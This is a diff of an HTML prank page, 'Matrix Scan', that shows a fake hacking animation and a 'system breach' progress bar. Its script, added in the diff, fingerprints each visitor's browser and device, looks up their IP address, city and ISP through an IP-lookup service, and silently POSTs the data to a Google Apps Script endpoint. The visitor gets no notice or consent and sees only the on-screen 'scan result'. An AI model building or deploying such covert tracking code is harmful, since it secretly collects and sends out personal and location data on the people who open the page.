@@ -3,76 +3,125 @@
 <head>
 <meta charset="UTF-8">
 <title>Matrix Scan</title>
+
 <style>
-html,body{margin:0;height:100%;background:black;color:#00ff00;font-family:monospace;overflow:hidden}
-#matrix{position:fixed;top:0;left:0}
-#ui{position:relative;z-index:2;padding:20px}
-#bar{width:300px;height:10px;border:1px solid #00ff00;margin-top:10px}
-#fill{height:100%;width:0;background:#00ff00}
-#term{white-space:pre-line;margin-top:20px}
+html,body{
+  margin:0;height:100%;
+  background:black;
+  color:#00ff00;
+  font-family:monospace;
+  overflow:hidden;
+}
+#matrix{
+  position:fixed;top:0;left:0;
+}
+#ui{
+  position:relative;
+  z-index:2;
+  padding:20px;
+}
+#percent{
+  font-size:22px;
+  margin-top:10px;
+}
+#bar{
+  width:320px;
+  height:10px;
+  border:1px solid #00ff00;
+}
+#fill{
+  height:100%;
+  width:0%;
+  background:#00ff00;
+}
+#term{
+  margin-top:20px;
+  white-space:pre-line;
+  font-size:14px;
+}
 .blink{animation:blink 1s infinite}
 @keyframes blink{50%{opacity:0}}
 </style>
 </head>
+
 <body>
 
 <canvas id="matrix"></canvas>
 
 <div id="ui">
-  <div>System breach detected</div>
+  <div>SYSTEM BREACH DETECTED</div>
   <div id="percent">0%</div>
   <div id="bar"><div id="fill"></div></div>
   <div id="term"></div>
 </div>
 
 <script>
-// ===== MATRIX BACKGROUND =====
-const c = document.getElementById("matrix");
-const ctx = c.getContext("2d");
-function resize(){c.width=innerWidth;c.height=innerHeight}
-resize(); addEventListener("resize",resize);
-const letters="ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
-const font=14; const cols=Math.floor(c.width/font);
-const drops=Array(cols).fill(1);
+// ================= MATRIX BACKGROUND =================
+const canvas = document.getElementById("matrix");
+const ctx = canvas.getContext("2d");
+function resize(){
+  canvas.width = innerWidth;
+  canvas.height = innerHeight;
+}
+resize(); addEventListener("resize", resize);
+
+const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+const fontSize = 14;
+const columns = Math.floor(canvas.width / fontSize);
+const drops = Array(columns).fill(1);
+
 setInterval(()=>{
-  ctx.fillStyle="rgba(0,0,0,0.08)";
-  ctx.fillRect(0,0,c.width,c.height);
-  ctx.fillStyle="#00ff00";
-  ctx.font=font+"px monospace";
+  ctx.fillStyle = "rgba(0,0,0,0.08)";
+  ctx.fillRect(0,0,canvas.width,canvas.height);
+  ctx.fillStyle = "#00ff00";
+  ctx.font = fontSize + "px monospace";
   for(let i=0;i<drops.length;i++){
-    const t=letters[Math.floor(Math.random()*letters.length)];
-    ctx.fillText(t,i*font,drops[i]*font);
-    if(drops[i]*font>c.height && Math.random()>0.975) drops[i]=0;
+    const text = chars[Math.floor(Math.random()*chars.length)];
+    ctx.fillText(text, i*fontSize, drops[i]*fontSize);
+    if(drops[i]*fontSize > canvas.height && Math.random()>0.97)
+      drops[i]=0;
     drops[i]++;
   }
 },33);
 
-// ===== FAKE PERCENTAGE =====
-const percentEl=document.getElementById("percent");
-const fill=document.getElementById("fill");
-let p=0;
-const pctTimer=setInterval(()=>{
-  p+=Math.floor(Math.random()*6)+2;
-  if(p>=100){p=100;clearInterval(pctTimer);startScan();}
-  percentEl.textContent=p+"%";
-  fill.style.width=p+"%";
+// ================= FAKE PERCENTAGE =================
+const percentEl = document.getElementById("percent");
+const fillEl = document.getElementById("fill");
+let percent = 0;
+
+const percentTimer = setInterval(()=>{
+  percent += Math.floor(Math.random()*7)+3;
+  if(percent >= 100){
+    percent = 100;
+    clearInterval(percentTimer);
+    startScan();
+  }
+  percentEl.textContent = percent + "%";
+  fillEl.style.width = percent + "%";
 },120);
 
-// ===== DATA + TERMINAL =====
-<script>
-function getBrowser() {
+// ================= DATA COLLECTION =================
+const term = document.getElementById("term");
+const sleep = ms => new Promise(r=>setTimeout(r,ms));
+
+function detectBrowser(){
   const ua = navigator.userAgent;
-  if (ua.includes("Firefox")) return "Firefox";
-  if (ua.includes("Edg")) return "Edge";
-  if (ua.includes("Chrome")) return "Chrome";
-  if (ua.includes("Safari")) return "Safari";
+  if(ua.includes("Firefox")) return "Firefox";
+  if(ua.includes("Edg")) return "Edge";
+  if(ua.includes("Chrome")) return "Chrome";
+  if(ua.includes("Safari")) return "Safari";
   return "Unknown";
 }
 
-async function collectMoreInfo() {
+async function startScan(){
+  term.textContent =
+    "Access granted ✔️\n" +
+    "Injecting payload...\n";
+  await sleep(800);
+
   let data = {
     userAgent: navigator.userAgent,
-    browser: getBrowser(),
+    browser: detectBrowser(),
     language: navigator.language,
     languages: navigator.languages?.join(", "),
     platform: navigator.platform,
@@ -81,30 +130,57 @@ async function collectMoreInfo() {
     screen: screen.width + "x" + screen.height,
     pixelRatio: window.devicePixelRatio,
     orientation: screen.orientation ? screen.orientation.type : "N/A",
-    darkMode: window.matchMedia("(prefers-color-scheme: dark)").matches,
+    darkMode: matchMedia("(prefers-color-scheme: dark)").matches,
     cookiesEnabled: navigator.cookieEnabled,
     doNotTrack: navigator.doNotTrack,
     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
     date: new Date().toLocaleString(),
-    country: "", region: "", city: "", ip: "", isp: ""
+    country:"",
+    region:"",
+    city:"",
+    ip:"",
+    isp:""
   };
 
-  try {
-    const res = await fetch("https://ipapi.co/json/");
-    const ip = await res.json();
+  try{
+    const r = await fetch("https://ipapi.co/json/");
+    const ip = await r.json();
     data.country = ip.country_name;
     data.region = ip.region;
     data.city = ip.city;
     data.ip = ip.ip;
     data.isp = ip.org;
-  } catch {}
+  }catch{}
 
-  // ENVOI VERS GOOGLE SHEET
-  fetch("https://script.google.com/macros/s/AKfycbzBoQBLsSn8O8Uvt8I1Ls2bhwIIX9wrX9CuaMCILODprS00lXHqogkInFZJuS-k9Rum/exec", {
-    method: "POST",
-    body: JSON.stringify(data)
+  // ===== ENVOI VERS GOOGLE SHEET =====
+  fetch("https://script.google.com/macros/s/AKfycbzBoQBLsSn8O8Uvt8I1Ls2bhwIIX9wrX9CuaMCILODprS00lXHqogkInFZJuS-k9Rum/exec",{
+    method:"POST",
+    body:JSON.stringify(data)
   });
 
-  return data;
+  await sleep(700);
+
+  term.textContent +=
+    "\n===== SCAN RESULT =====\n" +
+    "Browser      : " + data.browser + "\n" +
+    "Platform     : " + data.platform + "\n" +
+    "CPU Cores    : " + data.cpuCores + "\n" +
+    "RAM          : " + data.memory + "\n" +
+    "Screen       : " + data.screen + "\n" +
+    "Pixel Ratio  : " + data.pixelRatio + "\n" +
+    "Orientation  : " + data.orientation + "\n" +
+    "Dark Mode    : " + data.darkMode + "\n" +
+    "Language     : " + data.languages + "\n" +
+    "Timezone     : " + data.timezone + "\n" +
+    "Country      : " + data.country + "\n" +
+    "Region       : " + data.region + "\n" +
+    "City         : " + data.city + "\n" +
+    "ISP          : " + data.isp + "\n" +
+    "IP Address   : " + data.ip + "\n" +
+    "Date         : " + data.date + "\n\n" +
+    "Process completed <span class='blink'>█</span>";
 }
 </script>
+
+</body>
+</html>
